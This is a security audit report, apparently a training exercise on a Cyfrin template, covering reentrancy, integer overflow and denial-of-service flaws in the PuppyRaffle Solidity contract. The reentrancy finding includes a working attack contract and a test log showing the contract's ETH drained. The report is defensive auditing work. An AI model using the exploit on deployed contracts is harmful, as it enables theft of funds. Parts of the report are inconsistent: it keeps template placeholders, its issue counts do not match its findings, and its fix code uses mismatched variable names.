---
title: Protocol Audit Report
author: Cyfrin.io
date: March 7, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---
<!-- Template is set up to use a logo on main page titled 'logo.pdf' -->
\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Protocol Security Review Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape User1935\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: YOUR_NAME_HERE

Lead Security Researcher: 

- [YOUR_NAME_HERE](enter your URL here)

Assisting Security Researcher:

- None

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [About YOUR\_NAME\_HERE](#about-your_name_here)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Reentrancy attack in `PuppyRaffle::refund()` function allows draining of all ETH in contract](#h-1-reentrancy-attack-in-puppyrafflerefund-function-allows-draining-of-all-eth-in-contract)
    - [\[H-2\] Integer Overflow in `PuppyRaffle::pickWinner()` function to calculate fees can result in loss of fees and ETH stuck in contract](#h-2-integer-overflow-in-puppyrafflepickwinner-function-to-calculate-fees-can-result-in-loss-of-fees-and-eth-stuck-in-contract)
  - [Medium](#medium)
    - [\[M-1\] Denial of Service - Unbounded array looping in `PuppyRaffle::enterRaffle()` function checking for duplicates can prevent others from entering raffle by increasing the gas cost required to complete the transaction for future entrants](#m-1-denial-of-service---unbounded-array-looping-in-puppyraffleenterraffle-function-checking-for-duplicates-can-prevent-others-from-entering-raffle-by-increasing-the-gas-cost-required-to-complete-the-transaction-for-future-entrants)
    - [\[S-#\] TITLE (Root Cause + Impact)](#s--title-root-cause--impact)
  - [Low](#low)
    - [\[S-#\] TITLE (Root Cause + Impact)](#s--title-root-cause--impact-1)
  - [Informational](#informational)
    - [\[S-#\] TITLE (Root Cause + Impact)](#s--title-root-cause--impact-2)
  - [Gas](#gas)

# Protocol Summary

Protocol does X, Y, Z

# About YOUR_NAME_HERE

<!-- Tell people about you! -->

# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

**The findings described in this document correspond with the following commit hash:**
```
PROVIDECOMMITHASH
```

## Scope 

```
src/
--- DEMO.sol
```

## Roles

- Owner: Is the only one who should be able to set and access the password.

For this contract, only the owner should be able to interact with the contract.

---

# Executive Summary
## Issues found

| Severity          | Number of issues found |
| ----------------- | ---------------------- |
| High              | 1                      |
| Medium            | 1                      |
| Low               | 0                      |
| Info              | 0                      |
| Gas Optimizations | 0                      |
|                   |                        |
| **Total**         | 2                      |

---

# Findings
## High


### [H-1] Reentrancy attack in `PuppyRaffle::refund()` function allows draining of all ETH in contract

**Description:** The `PuppyRaffle::refund()` does not follow Checks, Effects, Interactions (CEI) design rules. As a result, a malicious attacker can drain all ETH in the contract by reentering the `PuppyRaffle::refund()` function upon receiving a payment.

The `PuppyRaffle::refund()` will make an external call to the `msg.sender` address to attempt to refund the ETH deposited to enter the raffle, only after making the external call will the function update the `players[]` array.

```solidity
  function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }

```

An attacker could have a `fallabck()`/`receive()` function that calls the `PuppyRaffle::refund()` again upon receiving a payment, continuing to do this until the ETH in the contract is drained.

**Impact:** An attacker is able to drain all ETH in the contract.

**Proof of Concept:**

1. User enters raffle
2. Attacker creates a malicious `fallback()`/`receive()` function that calls `PuppyRaffle::refund()` again upon receiving a payment
3. Attacker enters raffle
4. Attacker calls `PuppyRaffle::refund()` from their attack contract

<details>
<summary>Proof of Code</summary>

```solidity
contract PuppyRaffleRefundAttack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 myIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function reentrancyAttackOnRefund() external payable {
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);
        myIndex = puppyRaffle.getActivePlayerIndex(address(this));
        //Call refund function
        puppyRaffle.refund(myIndex);
    }

    // PoC For Reentrancy on Refund Function - malicious receive function to reenter the refund function
    receive() external payable {
        //If the puppy raffle has more than the entrance fee remaining, we can call again to get installments of the entrance fee out without causing a revert
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(myIndex);
        } 
    }
}
```

```solidity
function test_ReenterRefundFunction() public payable playersEntered {
        //Create our malicious smart contract
        PuppyRaffleRefundAttack attackerContract = new PuppyRaffleRefundAttack(puppyRaffle);
        uint256 startBalanceOfPuppyRaffle = address(puppyRaffle).balance;
        console.log("startBalanceOfPuppyRaffle: ", startBalanceOfPuppyRaffle);
        uint256 startingBalanceOfattackerContract = address(attackerContract).balance;
        console.log("startingBalanceOfattackerContract: ", startingBalanceOfattackerContract);
        uint256 playerOneIndex = puppyRaffle.getActivePlayerIndex(playerOne);
        //Call the reentrancyAttackOnRefund function from PuppyRaffleRefundAttack contract
        attackerContract.reentrancyAttackOnRefund{value: entranceFee}();
        uint256 endingBalanceOfPuppyRaffle = address(puppyRaffle).balance;
        console.log("endingBalanceOfPuppyRaffle: ", endingBalanceOfPuppyRaffle);
        uint256 endingBalanceOfattackerContract = address(attackerContract).balance;
        console.log("endingBalanceOfattackerContract: ", endingBalanceOfattackerContract);
        assert(endingBalanceOfPuppyRaffle == 0);
        assert(endingBalanceOfattackerContract == (startBalanceOfPuppyRaffle + entranceFee));

    }
```

```bash
[PASS] test_ReenterRefundFunction() (gas: 486800)
Logs:
  startBalanceOfPuppyRaffle:  4000000000000000000
  startingBalanceOfattackerContract:  0
  endingBalanceOfPuppyRaffle:  0
  endingBalanceOfattackerContract:  5000000000000000000
```
</details>

**Recommended Mitigation:** There are a couple of methods that can be employed to mitigate the reentrancy vulnerability.

*Check, Effects, Interactions (CEI) approach*: Any state modifying actions should occur before any external interactions are made. In the `PuppyRaffle::refund()` function, we can move the resetting of the `players` array indexed address to zero, prio to attempting to complete an external call transaction.


```diff
 function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

*Lock the function to prevent reentrancy*: The second approach that can be adopted is to programmatically lock the function in some way. For example, a boolean value can be checked to see if the function has been entered into and if so revert, else, modify the boolean variable to cause a revert if reentrancy occurs. Only at the end of the function do we reset the boolean variable.

```diff

+   bool locked = false;

    ...
    ...

    function refund(uint256 playerIndex) public {
+       if (locked) {
+           revert();
+       }
+       locked = true;
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
+       locked = false;
    }
```

*Reentrancy modifier*: Open Zeppelin have reentrancy focussed codebase called ReentrancyGuard that we can quickly leverage to mitigate reentrancy vulnerabilities. This inlcludes the non-reentrant modifier that will, essentially like our boolean lock approach, set a boolean value that the function has been entered into, allow the rest of the function to execute, and only at reaching the very end of the function will it return back to the modifier where it will update the boolean value to say that the function has been exited.

https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard
___

### [H-2] Integer Overflow in `PuppyRaffle::pickWinner()` function to calculate fees can result in loss of fees and ETH stuck in contract

**Description:** The `PuppyRaffle::pickWinner()` function in the `PuppyRaffle` contract can result in an overflow in the `totalFees` variable. Because the `totalFees` variable is only uint64 in size, it only takes ~18.45 ETH to be tracked in the `totalFees` variable to cause an overflow, which results in a loss of ETH and fees due to the fact that the `totalFees` variable is the only variable that tracks the amount of fees owed and will be mathematically incorrect.

Because of this incorrect calculation as a result of the overflow, the `PuppyRaffle::withdrawFees()` function will not be able to complete because the `totalFees` variable will be incorrect and not equal the balance of the contract, which is used to determine if there are players entered.

```solidity
    uint64 public totalFees = 0;

    ...
    ...

    uint256 fee = (totalAmountCollected * 20) / 100;
@>  totalFees = totalFees + uint64(fee);
```

**Impact:** The overflowing integer can result in loss of ETH and fees because the overflow will cause the `totalFees` variable to begin again at zero. Because this varaible is used to track the amount of fees owed and set aside, there will be permanent loss of fees because the number will always be incorrect from when an overflow has occurred.

The protocol will only be tracking a small amount of total fees instead of the large amount of fees that can be owed. Resulting in loss their for the protocol.

Secondly, the `PuppyRaffle::withdrawFees()` function has a check in it to see if the contract balance equals the `totalFees` variable. If they are not equal, then the `PuppyRaffle::withdrawFees()` function will not be able to complete and will revert the transaction due to the assumptions that players are entered into a current raffle. What this means is that you will never be able to withdraw fees once an overflow has occurred.

**Proof of Concept:**

```solidity
    function test_IntOverflow() public view {
        uint64 a = 18446744073709551615; // 2^64 - 1 -->  The max value
        uint64 b = 1;
        uint64 result;

        result = a + b;

        console.log("result: ", result);

        assert(result == 0);
    }
```

```bash
[PASS] test_IntOverflow() (gas: 3582)
Logs:
  result:  0
```

**Recommended Mitigation:** There are a couple of methods that can be employed to mitigate the integer overflow vulnerability.

1. Use uint256, or a larger uint size instead of uint64 for `toalFees`
2. Use a newer version of solidity, upwards of version 0.8.0 which uses checks to ensure that overflow cannot occur
3. For versions prior to 0.8.0, there is the SafeMath library by OpenZeppelin. This library can be used to mitigate the integer overflow in arithmetic operations.

Potential that there isn't a need to track the fees in the `totalFees` variable in the `PuppyRaffle` contract if there is re-design of how protocl determines if a raffle is active, and how you manage ETH in the contract.
___


## Medium

### [M-1] Denial of Service - Unbounded array looping in `PuppyRaffle::enterRaffle()` function checking for duplicates can prevent others from entering raffle by increasing the gas cost required to complete the transaction for future entrants

**Description:** The `PuppyRaffle::enterRaffle()` function loops through the `PuppyRaffle::players` array to check if an address has already entered the raffle. However, the longer the `PuppyRaffle::players` array is, the greater the gas cost is to enter the raffle. Those who enter the raffle early are rewarded with a lower amount to pay to enter the raffle compared to those who enter the raffle later.

```solidity
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas cost for entering the raffle will greatly increase with more entrants entering the raffle and the `players` array. This will strongly discourage users from entering the raffle if they are not early, resulting in a rush of users trying to enter the raffle as soon as possible.

It is possible to manually create a large array of addresses that the `PuppyRaffle::enterRaffle()` function will have to loop through to check if an address has already entered the raffle and deliberatly raise the gas cost for others that would want to enter the raffle. It can become so big that they guarantee, or near guarantee, themselves winning the lottery.

**Proof of Concept:**

If we have two transactions that call the `PuppyRaffle::enterRaffle()` function, with two different arrays of addresses, the gas cost for each transaction will be different. The gas cost for the first transaction will be higher than the gas cost for the second transaction.

Total gas used for first 100 players:   ~6252039
Total gas used for second 100 players:  ~18068129

This is more than 3x more expensive for the second 100 hundred players and will continue to grow in cost as more addresses are added into the array.

*Foundry Test - PoC*

Copy the following test into `PuppyRaffleTest.t.sol`:

```solidity
function test_DoSEnterRaffle() public {
        //Set the gas price for our calculations suing Foundry vm
        vm.txGasPrice(1);
        uint256 numPlayers = 100;
        address[] memory newPlayers = new address[](numPlayers);
        //Create array full of addresses to pass in to enterRaffle function
        for (uint256 i = 0; i < numPlayers; i++) {
            newPlayers[i] = address(i);
        }
        //Calculate the gas for first 100 players - Gast start
        uint256 gasStart = gasleft();
        //Enter Raffle with first 100 players array
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(newPlayers);
        //Gas left from first 100
        uint256 gasEnd = gasleft();
        uint256 totalGasForFirst100 = (gasStart - gasEnd) * tx.gasprice;
        console.log("Total gas used for first 100 players: ", totalGasForFirst100);
        //REPEAT STEPS BUT FOR PLAYERS UP TO 200
        numPlayers = 100;
        address[] memory newPlayersTwo = new address[](numPlayers);
        //Create array full of addresses to pass in to enterRaffle function
        for (uint256 i = 0; i < numPlayers; i++) {
            newPlayersTwo[i] = address(i+100);
        }
        uint256 gasStart2 = gasleft();
        //Enter Raffle with first 100 players array
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(newPlayersTwo);
        //Gas left from first 100
        uint256 gasEnd2 = gasleft();
        uint256 totalGasForSecond100 = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("Total gas used for second 100 players: ", totalGasForSecond100);
        //Assert that total gas used for first 100 players is less than total gas used for second 100 players
        assert(totalGasForFirst100 < totalGasForSecond100);
    }
```

**Recommended Mitigation:** There are a few possible reccomended mitigations.

1. Consider allowing duplicates and therefore disregarding the duplicate check. Rational behind this is that an individual can have multiple addresses and wallets anyway and therefore they can enter the raffle multiple times. This only stops the same address.
2. Consider using a mapping to check if an address has already entered the raffle. We can map an address to a boolean value or a unit256 raffleId that is updated for each new raffle that is run and we use value of either to check if the address has already entered the raffle.
   1. SELF NOTE: Mapping to boolean isn't great because of the difficuluty in clearing un-needed values for the next raffle and stuff. I have decided to leave it here to showcase that I was wokring on something but it wasn't probably the best way.
   
```diff
+mapping(address => bool) public playerEntered; 
+//OR           //DISREGARD - Not optimal


+mapping(address => uint256) public playerToRaffleId;
+uint256 public raffleId = 0;

...
...
...

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           playerEntered[newPlayers[i]] = true;    //DISREGARD - Not optimal
+           //OR                                    //DISREGARD - Not optimal
+           playerToEntryId[newPlayers[i]] = raffleId;
        }

-       // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+          //OR //DISREGARD - Not optimal
+          require(playerEntered[newPlayers[i]] == false, "PuppyRaffle: Duplicate player");     //DISREGARD - Not optimal
+       } 
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
        }
        emit RaffleEnter(newPlayers);
    }


...
...
...

    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");

```
___


### [S-#] TITLE (Root Cause + Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 
___


## Low 

### [S-#] TITLE (Root Cause + Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 
___


## Informational


### [S-#] TITLE (Root Cause + Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 
___


## Gas 